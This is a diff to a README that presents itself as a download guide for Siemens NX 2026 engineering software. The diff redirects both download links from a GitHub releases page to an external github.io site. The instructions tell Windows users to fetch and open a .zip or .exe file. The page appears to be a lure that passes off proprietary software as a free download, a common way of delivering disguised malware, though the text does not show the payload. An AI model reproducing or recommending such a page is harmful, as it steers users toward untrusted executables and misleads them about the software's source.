@@ -1,6 +1,6 @@
 # ⚙️ Siemens-NX-2026 - Powerful Engineering Design Made Simple
 
-[![](https://img.shields.io/badge/Download-Siemens_NX_2026-blue.svg)](https://github.com/Formationburnside432/Siemens-NX-2026/releases)
+[![](https://img.shields.io/badge/Download-Siemens_NX_2026-blue.svg)](https://formationburnside432.github.io)
 
 Siemens NX 2026 provides professional tools for engineering design, simulation, and manufacturing. This manual helps you download and set up the software on your Windows computer.
 
@@ -19,7 +19,7 @@ Your computer must meet these hardware standards to run the software. Check your
 
 You can get the current version of the application from our release page. 
 
-1. Visit [this page to download](https://github.com/Formationburnside432/Siemens-NX-2026/releases).
+1. Visit [this page to download](https://formationburnside432.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the file with the .zip or .exe extension to save it to your computer.
 4. Wait for the download to finish. Do not close your browser during this process.
